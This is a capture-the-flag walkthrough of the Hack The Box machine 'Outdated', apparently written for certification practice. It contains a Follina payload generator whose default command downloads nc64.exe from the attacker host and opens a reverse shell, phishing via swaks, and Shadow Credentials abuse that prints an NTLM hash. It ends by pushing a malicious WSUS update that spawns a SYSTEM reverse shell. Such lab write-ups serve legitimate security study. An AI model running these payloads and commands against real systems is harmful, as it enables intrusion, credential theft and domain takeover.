---
title: "HTB Outdated"
date: 2026-05-17 18:56 +0100
categories: [CPTS Preparation]
tags: [HTB, Machine, Windows, Meduim, WSUS]
image: /assets/img/posts/outdated/outdated.png
---

**HTB Outdated** is a Windows `Active Directory` machine that starts with retrieving a PDF from an `SMB` share containing a hint about a vulnerable internal email, exploiting the `Follina` (`CVE-2022-30190`) `MSDT` vulnerability by sending a malicious link via `SMTP` with `swaks` to gain a shell as `btables` on a client machine, using `BloodHound` to identify an `AddKeyCredentialLink` path to `sflowers`, abusing it with `Whisker` to perform `Shadow Credentials` and recover an `NTLM` hash, and escalating to `SYSTEM` on the DC by abusing a misconfigured `WSUS` server with `SharpWSUS` to deploy a malicious update.

## Reconnaissance

### Scanning

- Nmap (All ports)

```
nmap -p- 10.129.229.239 --min-rate 1000 -nv
```
```
PORT      STATE SERVICE
25/tcp    open  smtp
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
8530/tcp  open  unknown
8531/tcp  open  unknown
9389/tcp  open  adws
49667/tcp open  unknown
49693/tcp open  unknown
49694/tcp open  unknown
49935/tcp open  unknown
49948/tcp open  unknown
49961/tcp open  unknown
```

- NSE Scripts & Version

```
nmap -sCV -p25,53,88,135,139,389,445,464,593,636,3268,3269,5985,8530,8531,9389,49667,49693,49694,49935,49948,49961 10.129.229.239 --min-rate 1000 -nv -oA nmap/servic_version
```
```
PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-18 02:09:40Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-05-18T02:11:16+00:00; +8h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC.outdated.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.outdated.htb
| Issuer: commonName=outdated-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-05-18T01:38:10
| Not valid after:  2027-05-18T01:38:10
| MD5:     bb1d 8ff3 d509 172f 92fe 0f27 922a fd7c
| SHA-1:   e3ee 51f1 e762 04d8 8acf 3153 9226 66e5 da68 b9dd
|_SHA-256: d49a 5d81 3f30 e81f fa70 b14b c5b9 63d1 b23b bbaf 0831 8295 7592 a502 0ad9 f3c6
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.outdated.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.outdated.htb
| Issuer: commonName=outdated-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-05-18T01:38:10
| Not valid after:  2027-05-18T01:38:10
| MD5:     bb1d 8ff3 d509 172f 92fe 0f27 922a fd7c
| SHA-1:   e3ee 51f1 e762 04d8 8acf 3153 9226 66e5 da68 b9dd
|_SHA-256: d49a 5d81 3f30 e81f fa70 b14b c5b9 63d1 b23b bbaf 0831 8295 7592 a502 0ad9 f3c6
|_ssl-date: 2026-05-18T02:11:17+00:00; +8h00m01s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.outdated.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.outdated.htb
| Issuer: commonName=outdated-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-05-18T01:38:10
| Not valid after:  2027-05-18T01:38:10
| MD5:     bb1d 8ff3 d509 172f 92fe 0f27 922a fd7c
| SHA-1:   e3ee 51f1 e762 04d8 8acf 3153 9226 66e5 da68 b9dd
|_SHA-256: d49a 5d81 3f30 e81f fa70 b14b c5b9 63d1 b23b bbaf 0831 8295 7592 a502 0ad9 f3c6
|_ssl-date: 2026-05-18T02:11:19+00:00; +8h00m01s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.outdated.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.outdated.htb
| Issuer: commonName=outdated-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-05-18T01:38:10
| Not valid after:  2027-05-18T01:38:10
| MD5:     bb1d 8ff3 d509 172f 92fe 0f27 922a fd7c
| SHA-1:   e3ee 51f1 e762 04d8 8acf 3153 9226 66e5 da68 b9dd
|_SHA-256: d49a 5d81 3f30 e81f fa70 b14b c5b9 63d1 b23b bbaf 0831 8295 7592 a502 0ad9 f3c6
|_ssl-date: 2026-05-18T02:11:18+00:00; +8h00m01s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8530/tcp  open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title.
|_http-server-header: Microsoft-IIS/10.0
8531/tcp  open  unknown
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         Microsoft Windows RPC
49935/tcp open  msrpc         Microsoft Windows RPC
49948/tcp open  msrpc         Microsoft Windows RPC
49961/tcp open  msrpc         Microsoft Windows RPC
Service Info: Hosts: mail.outdated.htb, DC; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-05-18T02:10:37
|_  start_date: N/A
|_clock-skew: mean: 8h00m00s, deviation: 0s, median: 8h00m00s
```

### Configuration

- /etc/hosts

```bash
sudo nxc smb 10.129.229.239 --generate-hosts-file /etc/hosts
```

- /etc/krb5.conf

```bash
sudo nxc smb DC.outdated.htb --generate-krb5-file /etc/krb5.conf
```

- time

```bash
sudo ntpdate -u DC.outdated.htb
```

### SMB

```
➜  Outdated nxc smb DC.outdated.htb -u '' -p ''                                                                          
SMB         10.129.229.239  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:outdated.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.239  445    DC               [+] outdated.htb\: 
➜  Outdated nxc smb DC.outdated.htb -u '' -p '' --shares
SMB         10.129.229.239  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:outdated.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.239  445    DC               [+] outdated.htb\: 
SMB         10.129.229.239  445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED
➜  Outdated nxc smb DC.outdated.htb -u 'invalid' -p 'invalid' --shares
SMB         10.129.229.239  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:outdated.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.239  445    DC               [+] outdated.htb\invalid:invalid (Guest)
SMB         10.129.229.239  445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED
➜  Outdated nxc smb DC.outdated.htb -u 'invalid' -p '' --shares 
SMB         10.129.229.239  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:outdated.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.239  445    DC               [+] outdated.htb\invalid: (Guest)
SMB         10.129.229.239  445    DC               [*] Enumerated shares
SMB         10.129.229.239  445    DC               Share           Permissions     Remark
SMB         10.129.229.239  445    DC               -----           -----------     ------
SMB         10.129.229.239  445    DC               ADMIN$                          Remote Admin
SMB         10.129.229.239  445    DC               C$                              Default share
SMB         10.129.229.239  445    DC               IPC$            READ            Remote IPC
SMB         10.129.229.239  445    DC               NETLOGON                        Logon server share 
SMB         10.129.229.239  445    DC               Shares          READ            
SMB         10.129.229.239  445    DC               SYSVOL                          Logon server share 
SMB         10.129.229.239  445    DC               UpdateServicesPackages                 A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.
SMB         10.129.229.239  445    DC               WsusContent                     A network share to be used by Local Publishing to place published content on this WSUS system.
SMB         10.129.229.239  445    DC               WSUSTemp                        A network share used by Local Publishing from a Remote WSUS Console Instance.
```
```
impacket-smbclient 'outdated.htb\invalid@DC.outdated.htb'
get NOC_Reminder.pdf
```
![pdf](/assets/img/posts/outdated/pdf.png)

## Exploit

- [msdt-follina](https://github.com/JohnHammond/msdt-follina)

```python
#!/usr/bin/env python3
import base64
import random
import string
import sys
if len(sys.argv) > 1:
    command = sys.argv[1]
else:
    command = "IWR http://10.10.14.186/nc64.exe -outfile C:\\programdata\\nc64.exe; C:\\programdata\\nc64.exe 10.10.14.186 9001 -e cmd"
    //command = "IWR http://10.10.14.186/shell.ps1 -outfile C:\\programdata\\shell.ps1; powershell -ExecutionPolicy Bypass -File C:\\ProgramData\\shell.ps1"

base64_payload = base64.b64encode(command.encode("utf-8")).decode("utf-8")

# Slap together a unique MS-MSDT payload that is over 4096 bytes at minimum
html_payload = f"""<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{base64_payload}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //"""
html_payload += (
    "".join([random.choice(string.ascii_lowercase) for _ in range(4096)])
    + "\n</script>"
)
print(html_payload)
```

```
swaks --to itsupport@outdated.htb --from "hoxon@hoxon.htb" --header "Subject: web app" --body "http://10.10.14.186/index.html" --server mail.outdated.htb
```

```
uv run -m http.server 80       
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.229.239 - - [17/May/2026 22:47:08] "GET /index.html HTTP/1.1" 200 -
10.129.229.239 - - [17/May/2026 22:47:15] "GET /nc64.exe HTTP/1.1" 200 -
```

## Shell as btables

```
➜  Outdated rlwrap -cAr nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.186] from (UNKNOWN) [10.129.229.239] 49881
Microsoft Windows [Version 10.0.19043.928]
(c) Microsoft Corporation. All rights reserved.
C:\Users\btables\AppData\Local\Temp\SDIAG_5d808321-52c6-401e-bf14-51b0aa23419a>whoami
whoami
outdated\btables
```

```
C:\ProgramData>hostname
client
C:\ProgramData>ipconfig
IPv4 Address. . . . . . . . . . . : 172.16.20.20
```

- [ConPtyShell](https://github.com/antonioCoco/ConPtyShell)

```
Invoke-ConPtyShell 10.10.14.186 9001
```
```
IEX(New-Object Net.NewWebClient).downloadString('http://10.10.X.X/shell.ps1')
```
```
stty raw -echo; (stty size; cat) | nc -lvnp 9001
```

### SharpHound

```
PS C:\programdata> iwr http://10.10.14.186/SharpHound.exe -OutFile sh.exe
PS C:\programdata> .\sh.exe -c all
```

### BloodHound

```
sudo impacket-smbserver -smb2support share $(pwd) -user hoxon -pass hoxon
```
```
PS C:\programdata> net use \\10.10.14.186\share /u:hoxon hoxon                   
The command completed successfully.
PS C:\programdata> copy 20260517191727_BloodHound.zip //10.10.14.186/share
```

### AddKeyCredentialLink

![add-key](/assets/img/posts/outdated/addkeys.png)

- [whisker](https://github.com/eladshamir/Whisker)

```
.\wk.exe add /target:sflowers
```

![sflowers](/assets/img/posts/outdated/hash.png)

```
sflowers:1FCDB1F6015DCB318CC77BB2BDA14DB5
```

### CanPSRemote

![ps](/assets/img/posts/outdated/ps.png)

```
evil-winrm -i DC.outdated.htb -u 'sflowers' -H '1FCDB1F6015DCB318CC77BB2BDA14DB5'
```

### WSUS

![wsus](/assets/img/posts/outdated/wsus.png)

```
iwr http://10.10.14.186/SharpWSUS.exe -OutFile sw.exe
iwr http://10.10.14.186/PsExec64.exe -OutFile ps.exe
```

```
.\sw.exe inspect
```
```
.\sw.exe create /payload:"C:\programdata\ps.exe" /args:" -accepteula -s -d c:\programdata\nc64.exe -e cmd.exe 10.10.14.186 9002" /title:"NIXOX"
```
```
.\sw.exe approve /updateid:2771a20c-cf23-4cb2-a383-4f3591ae70ba /computername:dc.outdated.htb /groupname:"Critical"
```
```
.\sw.exe check /updateid:2771a20c-cf23-4cb2-a383-4f3591ae70ba /computername:dc.outdated.htb
```

```
➜  Outdated rlwrap -cAr nc -lvnp 9002
listening on [any] 9002 ...
connect to [10.10.14.186] from (UNKNOWN) [10.129.229.239] 55159
Microsoft Windows [Version 10.0.17763.1432]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
